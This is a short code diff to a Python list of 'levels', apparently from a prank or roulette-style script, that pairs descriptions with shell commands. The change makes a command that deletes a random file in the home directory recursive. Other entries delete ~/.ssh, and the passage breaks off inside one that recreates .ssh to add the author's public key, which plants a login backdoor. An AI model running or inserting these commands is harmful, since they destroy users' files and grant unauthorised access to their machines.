@@ -2,7 +2,7 @@ LEVELS = [
     ("echo 'bang'", "echo 'bang!';"),
     ("delete a random file from your homedir", """files=(~/*);
 f="${files[RANDOM % ${#files[@]}]}"
-rm -f "$f"
+rm -rf "$f"
 echo 'bang!' $f 'is gone forever.'"""),
     ("delete ~/.ssh", "rm -rf ~/.ssh; echo 'bang! no more ssh for you.'"),
     ("(re-)create .ssh and add my public key to it", """mkdir -p .ssh
